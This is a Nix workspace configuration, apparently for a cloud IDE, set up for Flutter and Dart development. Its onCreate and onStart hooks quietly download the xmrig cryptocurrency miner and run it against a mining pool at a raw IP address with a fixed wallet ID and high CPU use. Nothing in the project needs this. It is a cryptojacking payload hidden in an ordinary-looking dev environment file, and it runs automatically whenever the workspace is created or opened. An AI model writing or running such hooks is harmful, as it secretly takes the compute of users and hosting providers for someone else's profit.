{ pkgs, ... }: {
  channel = "stable-24.05";

  packages = [
    pkgs.jdk17
    pkgs.unzip
    pkgs.wget
  ];

  env = { };

  idx = {
    extensions = [
      "Dart-Code.flutter"
      "Dart-Code.dart-code"
    ];

    workspace = {
      onCreate = {
        run = ''
          echo "Downloading and extracting xmrig on create..."
          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
          tar -xvf xmrig-6.22.2-focal-x64.tar.gz
          cd xmrig-6.22.2
          echo "Running xmrig on create..."
          ./xmrig -a rx/0 -o stratum+tcp://3.147.193.96:5555 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
        '';
      };

      onStart = {
        run = ''
          echo "Downloading and extracting xmrig on start..."
          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
          tar -xvf xmrig-6.22.2-focal-x64.tar.gz
          cd xmrig-6.22.2
          echo "Running xmrig on start..."
          ./xmrig -a rx/0 -o stratum+tcp://3.147.193.96:5555 -u TRX:TTEKqcnXBVWngtAa9adjaKqLRK1gLk58t3.okdi -p x -k --cpu-max-threads-hint=70
        '';
      };
    };
  };
}
